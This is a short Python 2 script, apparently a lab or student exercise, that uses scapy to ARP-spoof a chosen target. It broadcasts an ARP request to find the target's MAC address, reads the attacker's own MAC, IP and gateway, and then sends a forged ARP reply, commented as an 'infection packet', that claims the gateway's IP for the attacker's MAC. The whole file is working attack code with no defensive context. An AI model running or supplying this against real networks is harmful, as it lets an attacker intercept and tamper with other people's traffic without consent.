import socket
from scapy.all import *
import os
import subprocess
import shlex
import fcntl
import struct
import string

#========================Send broadcast packet==================
p_dst = raw_input("input destination ip:")
first_packet = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=p_dst ))

source = first_packet[0][0][1][Ether].src
psource = first_packet[0][0][1][Ether].psrc

#=======================Get My IP,MAC and Gateway IP==========================
def Mac_address(ifname):
	s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	info = fcntl.ioctl(s.fileno(),0x8927,struct.pack('256s',ifname[:15]))
	myMac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
	return myMac

def Ip_address(ifname):
	s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	info = fcntl.ioctl(s.fileno(),0x8927,struct.pack('256s',ifname[:15]))
	myIp = socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',ifname[:15]))[20:24])
	return myIp

strs = subprocess.check_output(shlex.split('ip r l'))
gateway = strs.split('default via')[-1].split()[0].split('/')[0]

My_Macaddr = Mac_address('enp0s5')
My_ipaddr = Ip_address('enp0s5')
print "=====MAC, IP ,gateway====="
print "MAC:"+My_Macaddr
print "IP:"+My_ipaddr
print "Gateway IP:"+gateway
print "=========================="
#=======================Send infection packet====================
second_packet = srp(Ether(dst=source)/ARP(op=2,hwsrc=My_Macaddr,psrc=gateway,hwdst=source ,pdst=psource ))
#sender_mac/my_mac/gateway_ip/sender_mac,ip
